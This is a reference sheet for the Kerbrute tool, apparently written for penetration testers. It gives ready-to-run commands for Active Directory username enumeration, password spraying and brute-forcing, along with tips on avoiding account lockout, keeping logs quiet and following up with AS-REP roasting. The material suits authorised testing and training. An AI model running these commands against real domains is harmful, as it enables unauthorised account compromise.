# Kerbrute

- **Category**: Password Attacks / Kerberos Enumeration
- **Risk Level**: 🟡 Medium

---

## Description

A tool for enumerating valid Active Directory accounts and spraying passwords against Kerberos (port 88/TCP) — without triggering standard account lockout policies on many AD configurations. Uses Kerberos pre-authentication to validate usernames via AS-REQ, which generates less noise than LDAP/SMB enumeration. Also flags AS-REP roastable accounts during enumeration.

## Installation

```bash
# Download the Linux amd64 release binary from the official GitHub releases page
curl -L https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -o kerbrute

chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/kerbrute
kerbrute --help
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `userenum` | Enumerate valid usernames via Kerberos AS-REQ |
| `passwordspray` | Spray one password against all users in a list |
| `bruteuser` | Brute-force a single user account |
| `bruteforce` | Brute-force using a user:pass pairs file |
| `-d <domain>` | Target domain name |
| `--dc <ip>` | Domain controller IP address |
| `<userlist>` | Username list file (positional argument to `userenum` or `bruteuser`) |
| `<password>` | Password to spray (positional argument to `passwordspray`) |
| `--safe` | Abort if any account is detected as locked out (lockout protection) |
| `-t <n>` | Threads (default: 10) |
| `-o <file>` | Output file for results |
| `-v` | Verbose output |

## Common Commands

```bash
# Enumerate valid usernames (no password required, low noise)
kerbrute userenum -d corp.local --dc 192.168.1.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password spray (one password against all valid users)
kerbrute passwordspray -d corp.local --dc 192.168.1.10 users.txt 'Welcome2024!'

# Use --safe to abort if lockout is detected
kerbrute passwordspray -d corp.local --dc 192.168.1.10 --safe users.txt 'Summer2024!'

# Brute-force a single account
kerbrute bruteuser -d corp.local --dc 192.168.1.10 /usr/share/wordlists/rockyou.txt jdoe

# Save results to file
kerbrute userenum -d corp.local --dc 192.168.1.10 usernames.txt -o valid_users.txt
```

## Notes & Tips

1. Username enumeration (`userenum`) requires no password and generates minimal logs — always do this first to build a valid user list.
2. Before password spraying, check the AD lockout policy via `enum4linux-ng` or `netexec` — one spray per 30 minutes is typically safe for 5-attempt-per-lockout policies.
3. kerbrute targets TCP port 88 (Kerberos) — ensure your host can reach the DC on that port.
4. Accounts flagged as `VALID USERNAME` are confirmed active; accounts showing AS-REP roastable are high-value targets for `impacket-GetNPUsers`.
5. Combine with `impacket-GetNPUsers` to immediately AS-REP roast any pre-auth disabled accounts found during enumeration.

---

## Official References

- [kerbrute (GitHub)](https://github.com/ropnop/kerbrute)
